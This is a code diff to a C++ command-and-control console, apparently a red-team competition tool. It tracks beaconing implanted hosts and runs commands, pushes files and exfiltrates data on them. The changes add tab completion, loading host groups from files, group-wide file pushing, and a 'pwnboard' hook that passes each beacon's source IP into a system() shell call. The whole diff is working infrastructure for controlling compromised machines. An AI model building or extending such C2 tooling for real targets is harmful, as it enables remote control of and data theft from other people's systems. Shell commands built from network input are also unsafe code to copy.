@@ -25,6 +25,9 @@
 #include <algorithm>
 #include <functional>
 
+#include <readline/history.h>
+#include <readline/readline.h>
+
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -34,6 +37,8 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include <netdb.h>
+
+#define PWNBOARD
 
 struct command_t
 {
@@ -80,6 +85,7 @@ static const std::map<std::string, command_t> commands = {
   { "group", { cmd_group,
                "group: by default this command lists all groups\n"
                "\tadd/rm [group] [host]: adds/removes a host to a group to run commands on\n"
+               "\tload [group] [file]: loads group information from a file\n"
                "\tlist [group]: lists all hosts within a group" } },
   { "set", { cmd_set, "set [host/group]: sets the current host to run commands on" } },
   { "run", { cmd_run, "run [command]: runs a command on the currently set host" } },
@@ -278,9 +284,23 @@ void listen_task()
 
       // only store hostname into active connections list if a beacon is sent
       auto split = split_input(hostname);
+      if (split.size() < 1) {
+        continue;
+      }
       if (split.at(0).compare("(beacon)") == 0) {
         std::lock_guard<std::mutex> guard(active_connections_mutex);
-        active_connections[split.at(1)] = src_ip;
+        std::string key = split.at(1);
+        key.append("@");
+        key.append(src_ip);
+        active_connections[key] = src_ip;
+
+#ifdef PWNBOARD
+        std::string pwnboard_cmd = "./pwnboard.sh ";
+        pwnboard_cmd.append(src_ip);
+        pwnboard_cmd.append(" ");
+        pwnboard_cmd.append("pingd");
+        system(pwnboard_cmd.c_str());
+#endif// PWNBOARD
       }
     }
   }
@@ -545,9 +565,7 @@ void cmd_group(const std::string &input)
     } else {
       groups.at(group_name).emplace_back(host_name);
     }
-    return;
-  }
-  if (sub_cmd == "rm") {
+  } else if (sub_cmd == "rm") {
     if (input_arr.size() < 4) {
       std::puts("usage: rm [group] [host]");
       return;
@@ -561,9 +579,25 @@ void cmd_group(const std::string &input)
       auto itr = std::find(group.begin(), group.end(), host_name);
       if (itr != group.end()) group.erase(itr);
     }
-    return;
-  }
-  if (sub_cmd == "list") {
+  } else if (sub_cmd == "load") {
+    if (input_arr.size() < 4) {
+      std::puts("usage: load [group] [file]");
+      return;
+    }
+    auto &group_name = input_arr.at(2);
+    auto &filename = input_arr.at(3);
+    if (groups.find(group_name) == groups.end()) {
+      groups[group_name] = std::vector<std::string>{};
+    }
+    std::ifstream file(filename);
+    if (file.is_open()) {
+      std::string host;
+      while (file >> host) {
+        groups[group_name].emplace_back(host);
+      }
+      file.close();
+    }
+  } else if (sub_cmd == "list") {
     if (input_arr.size() < 3) {
       std::puts("usage: list [group]");
       return;
@@ -577,7 +611,6 @@ void cmd_group(const std::string &input)
         std::puts(host.c_str());
       }
     }
-    return;
   }
 }
 
@@ -648,12 +681,28 @@ void cmd_file(const std::string &input)
     std::puts("usage: file [src] [dst]");
     return;
   }
-  std::string ip = active_connections[cur_host];
 
-  std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-            << ip
-            << "\n";
-  send_file(ip, input_arr.at(1), input_arr.at(2));
+  if (!cur_host.empty()) {
+    std::string ip = active_connections[cur_host];
+    std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+              << ip
+              << "\n";
+    send_file(ip, input_arr.at(1), input_arr.at(2));
+  } else if (!cur_group.empty()) {
+    auto &group = groups.at(cur_group);
+    for (auto &host : group) {
+      if (active_connections.find(host) == active_connections.end()) {
+        continue;
+      }
+      std::string ip = active_connections[host];
+      std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+                << ip
+                << "\n";
+      send_file(ip, input_arr.at(1), input_arr.at(2));
+    }
+  } else {
+    std::puts("no group or host selected!");
+  }
 }
 
 void cmd_exfil(const std::string &input)
@@ -738,6 +787,50 @@ void cmd_exit(const std::string &)
   exit(0);
 }
 
+char *command_generator(const char *text, int state)
+{
+  static std::vector<std::string> matches;
+  static size_t match_index = 0;
+
+  if (state == 0) {
+    matches.clear();
+    match_index = 0;
+
+    std::string textstr(text);
+    for (auto it = commands.begin(); it != commands.end(); it++) {
+      auto &word = it->first;
+      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
+        matches.push_back(word);
+      }
+    }
+
+    for (auto it = active_connections.begin(); it != active_connections.end(); it++) {
+      auto &word = it->first;
+      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
+        matches.push_back(word);
+      }
+    }
+
+    for (auto it = groups.begin(); it != groups.end(); it++) {
+      auto &word = it->first;
+      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
+        matches.push_back(word);
+      }
+    }
+  }
+
+  if (match_index >= matches.size()) {
+    return nullptr;
+  } else {
+    return strdup(matches[match_index++].c_str());
+  }
+}
+
+char **command_completion(const char *text, int start, int end)
+{
+  return rl_completion_matches(text, command_generator);
+}
+
 /**
  * @brief Main entry point.
  * 
@@ -761,15 +854,25 @@ int main(int argc, char **argv)
   std::thread listen_thread(listen_task);
   listen_thread.detach();
 
+  rl_attempted_completion_function = command_completion;
+
+  char *buf;
+  std::string input;
+
   // begin command loop
   while (1) {
-    std::string input;
-    std::cout << (cur_host.empty() ? cur_group : cur_host) << " > ";
-    std::getline(std::cin, input);
+    std::string prompt = (cur_host.empty() ? cur_group : cur_host) + " > ";
+    if ((buf = readline(prompt.c_str())) == nullptr) {
+      break;
+    }
+    input = buf;
 
     if (input.empty()) {
       continue;
     }
+
+    add_history(buf);
+    free(buf);
 
     // split input by spaces and save into an vector
     auto input_arr = split_input(input);
